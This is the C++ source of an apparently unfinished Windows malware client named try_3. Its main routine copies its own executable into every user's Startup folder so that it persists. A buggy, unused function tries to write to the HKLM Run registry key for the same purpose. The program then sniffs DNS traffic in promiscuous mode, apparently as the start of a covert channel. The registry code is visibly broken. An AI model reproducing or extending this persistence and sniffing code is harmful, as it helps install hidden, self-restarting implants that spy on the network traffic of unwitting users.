// try_3.cpp : Defines the entry point for the console application.
// Purpose:  This is a functioning client

#include "stdafx.h"
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <winapifamily.h>
#include <stdlib.h>
#include <stdio.h>
#include <vector>
#include <pcap.h>

//specify WinSock lib or else symbols will not match
#pragma comment(lib,"ws2_32.lib") //WinSock lib

//contains the dns packet data
typedef struct dns_payload {
	u_char size;
	u_char junk;
	u_char junk2;
}dns_payload;

// 4 bytes IP addresses
typedef struct ip_address {
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;

//dns header
typedef struct dns_header {
	u_short identifier;
	u_short flags_codes;
	u_short qcount;
	u_short acount;
	u_short nscount;
	u_short arcount;
}dns_header;

// UDP header used for dns packets
typedef struct udp_header {
	u_short sport;          // Source port
	u_short dport;          // Destination port
	u_short len;            // Datagram length
	u_short crc;            // Checksum
}udp_header;

/*
*This struct will be used to decapsulate tcp headers
*/
typedef struct tcp_head {
	u_short sport;
	u_short dport;
	u_int seq_num;
	u_int ack_num;
	u_char data_off;
	u_char flag;
	u_short win_size;
	u_short checksum;
	u_short urgpoint;
}tcp_head;

/*
*This struct will be used to decapsulate ipv4 headers
*/
typedef struct IPv4 {
	u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
	u_char  tos;            // Type of service 
	u_short tlen;           // Total length 
	u_short identification; // Identification
	u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
	u_char  ttl;            // Time to live
	u_char  proto;          // Protocol
	u_short crc;            // Header checksum
	ip_address  saddr;      // Source address
	ip_address  daddr;      // Destination address
	u_int   op_pad;         // Option + Padding
}IPv4;

/*
 *This struct will be used to decode Ethernet headers
 */
typedef struct eth_header {
	u_char dest[6];
	u_char src[6];
	u_short type;
}eth_header;

/*
* This function will edit registries in order to
* obtain persistence for the client and check to
* see if this has already been accomplished.
*/
int reg_maker() {
	int result = 0; //holds the result of function

					//check if reg key exists
	char* key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hkey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
		std::cout << "if one" << std::endl;
		DWORD data = 0;
		DWORD length = sizeof(data);
		DWORD type = REG_DWORD;
		char* value = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence";

		//Query Value to check if it has the location of the file in it
		///////////////////////////////////////ERROR HERE//////////////////////////////////////////////
		if (RegQueryValueExA(HKEY_LOCAL_MACHINE, value, 0, (LPDWORD)&type, (LPBYTE)&data, &length) != ERROR_SUCCESS)
			std::cout << "Could not query reg key" << std::endl;
		///////////////////////////////////////////////////////////////////////////////////////////////
		else {
			//data += "C:\\Users\\michael\\Documents\\Visual Studio 2015\\Projects\\try_3\\Debug\\try_3.exe";
			//Add key inside try_3 using the RegSetValueExA function
			if (RegSetValueExA(HKEY_LOCAL_MACHINE, value, NULL, REG_DWORD, (LPBYTE)&data, sizeof(DWORD)) != ERROR_SUCCESS)
				std::cout << "Failed to set registry value" << std::endl;
			std::cout << data << std::endl;
		}
	}
	else
		std::cout << "Could not open reg key" << std::endl;



	//close registry editor
	return 0;
}

/*
 *This function will split a string based on
 *the character to passed to it and insert the
 *parts into a vector
 */
void split(const std::string& s, char delim, std::vector<std::string>& v) {
	std::string::size_type i = 0;
	std::string::size_type j = s.find(delim);

	while (j != std::string::npos) {
		v.push_back(s.substr(i, j - i));
		i = ++j;
		j = s.find(delim, j);

		if (j == std::string::npos)
			v.push_back(s.substr(i, s.length()));
	}
}

/*
 *remove the spaces from each string in the vector
 */
void remover(std::vector<std::string>& v) {
	for (int i = 0; i < v.size(); i++) {
		std::string getting_changed = v[i];
		std::string changed_str = "";
		for (int i = 0; i < getting_changed.size(); i++) {
			if (' ' != getting_changed[i]) {
				changed_str += getting_changed[i];
			}
		}
		v[i] = changed_str;
	}
}

/*
 *Checks to see in character matched
 *a character in the alphabet or used for directories
 */
int matcher(char firstletter) {
	std::string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\._:0123456789";
	int res = alphabet.find(firstletter);

	return res;
}

/*
 *This will parse the output of a dir command
 *and return a vector of Users directories
 */
std::string parser(const std::string res, std::vector<std::string> v) {
	std::string directories = "";
	split(res, '\n', v);
	remover(v);
	
	for (int i = 0; i < v.size(); i++) {
		int temp = v[i].find('>');
		if (temp == 21) {
			int res = matcher(v[i][22]);
			if (res > -1) {
				for (int x = 22; x < v[i].size(); x++) {
					directories = directories + v[i][x];
				}
			}
		}
		directories += " ";
	}
	
	return directories;
}

/*
 *Finds the current path of the program
 */
std::string find_curr_dir() {
	char Path[FILENAME_MAX];
	std::string exePath = "";

	//Will contain exe path
	HMODULE hmodule = GetModuleHandle(NULL);
	if (hmodule != NULL) {
		//When passing NULL to GetModuleHandle, it returns handle of exe itself
		GetModuleFileName(hmodule, (LPTSTR) Path, (sizeof(Path)));
		
		//Parses the Character array
		for (int i = 0; i < 260; i++) {
			if (matcher(Path[i]) != -1) {
				exePath += Path[i];
			}
			else if (Path[i] == ' ') {
				exePath += Path[i];
			}
		}
	}
	else {
		std::cout << "Module handle is NULL" << std::endl;
	}

	return exePath;
}

/*
 *This function prints the directories/files of the Users
 *directory and sends them to the char buffer via the pipe
 */
int startup_finder() {
	const char* cmd = "dir C:\\Users";
	char buffer[128];
	std::string start = "C:\\Users\\";
	std::string end = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	std::string exePath = find_curr_dir();
	std::string result = "";
	std::vector<std::string> parts;
	std::vector<std::string> folder;
	FILE* _pipe = _popen(cmd, "r");

	//redirects stdout to pipe and adds elements of buffer to result string
	if (!_pipe) {
		std::cout << "ERROR" << std::endl;
	}
	
	while (!feof(_pipe)) {
		if (fgets(buffer, 128, _pipe) != NULL)
			result += buffer;
	}
	_pclose(_pipe);

	
	/*
	 *Parses result and Splits result string by spaces
	 *Loops parts vector to find elements that contain
	 *directories then copies the exe to those directories
	 */
	result = parser(result, parts);
	split(result, ' ', parts);
	for (int i = 0; i < parts.size(); i++) {
		int rest = matcher(parts[i][0]);
		if (rest != -1) {
			folder.push_back(parts[i]);
			if (parts[i].find('.') == -1) {
				std::string startup_dir = "copy /B \"" + exePath + "\" \"" + start + parts[i] + end + "\"";
				int i = system(startup_dir.c_str());
			}
		}
	}

	return 0;
}

/*
 *This function will find the size of lists created by functions in wpdpack libs
 *list: should be the first point of a pcap interface list
 *returns: the size of the list parameter
 */
int size_of_list(pcap_if_t*  list) {
	int size = 0;

	//loops until d is NULL and counts elements
	for (pcap_if_t* d = list; d != NULL; d = d->next) {
		std::cout << "Printing device list" << std::endl << d->description << std::endl;
		size++;
	}

	return size;
}

/*
 *This function will decapsulate packets
 *and call functions if needed
 *renturns nothing 
 */
void decapsulate(const u_char *data, int size) {
	eth_header* eth_hdr;
	eth_hdr = (eth_header*)data;
	IPv4* ih;
	u_int head_len;
	//tcp_head* th;
	udp_header* uh;
	u_short sport;
	u_short dport;
	dns_header* dns_h;
	dns_payload* dns_pay;

	if (ntohs(eth_hdr->type) == 0x800) {
		// retireve the position of the ip header
		ih = (IPv4 *)(data + 14); //length of ethernet header

		// print ip addresses
		printf("%d.%d.%d.%d -> %d.%d.%d.%d\n",
			ih->saddr.byte1,
			ih->saddr.byte2,
			ih->saddr.byte3,
			ih->saddr.byte4,
			ih->daddr.byte1,
			ih->daddr.byte2,
			ih->daddr.byte3,
			ih->daddr.byte4);

		//get tcp header
		/*ip_head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
		th = (tcp_head *)((u_char*)ih + ip_head_len);*/

		//get udp header = pointer + length of ipheader
		head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
		uh = (udp_header *)((u_char*)ih + head_len);

		//convert form network byte order to host byte order
		sport = ntohs(uh->sport);
		dport = ntohs(uh->dport);

		std::cout << "source " << sport << "dest " << dport << "length " << head_len << std::endl;

		//dns header = point + udp header
		head_len = 8; //standard length of udp header is 8 bytes
		dns_h = (dns_header *)((u_char*)uh + head_len);

		std::cout << "Identifier " << dns_h->identifier << std::endl;

		//dns payload= pointer + dns header size
		head_len = 12;
		dns_pay = (dns_payload *)((u_char*)dns_h + head_len);

		//test loop
		for (u_int i = 0; i < 10; i++) {
			u_char* temp = (u_char*)dns_h + head_len + i;
			std::cout << temp << std::endl;
		}
	}
}

/*
 *This function will take care of packet capture using winpcap library
 *returns: 0 if successful otherwise returns -1
 */
pcap_if_t* capture_em_packets() {
	pcap_if_t* all_devices;				//first point of interface list
	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer

	//returns on error
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &all_devices, error_msg) == -1) {
		std::cout << "did not get device list" << std::endl;
		return NULL;
	}
	
	//returns if no interfaces
	if (size_of_list(all_devices) == 0) {
		return NULL;
	}

	//select interface
	//In this case inteface selected is the second interface
	pcap_if_t* device = all_devices;
	if(device != NULL)
		return device;

	return NULL;
}

/*
 *
 */
int main()
{
	//Implements persistence by copying itself to startup folder
	//redirect output into stdout to buffer via pipe
	startup_finder();

	//captures packets using winpcap driver
	pcap_if_t* device = capture_em_packets();//device is pointer to list of devices
	
	pcap_t* adhandle;					//stores the handle created by pcap_open for pcap_next_ex to read packets
	struct pcap_pkthdr *pktHeader;		//stores packet header information
	const u_char *pkt_data;				//stores packet data
	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer
	struct bpf_program opcode;			//this will contain useful shit
	u_int netmask;						//this will contain the netmask of the interface capturing

	//open dev list
	if ((adhandle = pcap_open(device->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, error_msg)) == NULL) {
		pcap_freealldevs(device);
		return -1;
	}

	//compile filter
	netmask = ((struct sockaddr_in*) (device->addresses->netmask))->sin_addr.S_un.S_addr;
	if (pcap_compile(adhandle, &opcode, "ip proto \\udp and port 53", 1, netmask) < 0) {
		pcap_freealldevs(device);
		return -1;
	}

	//set filter
	if (pcap_setfilter(adhandle, &opcode) < 0) {
		pcap_freealldevs(device);
		return -1;
	}

	//free dev list
	pcap_freealldevs(device);

	//capture packets on dev
	while (true) {
		pcap_next_ex(adhandle, &pktHeader, &pkt_data);

		//inspect packet
		if (pktHeader->len > 0) {
			decapsulate(pkt_data, pktHeader->caplen);
		}
	}

    return 0;
}

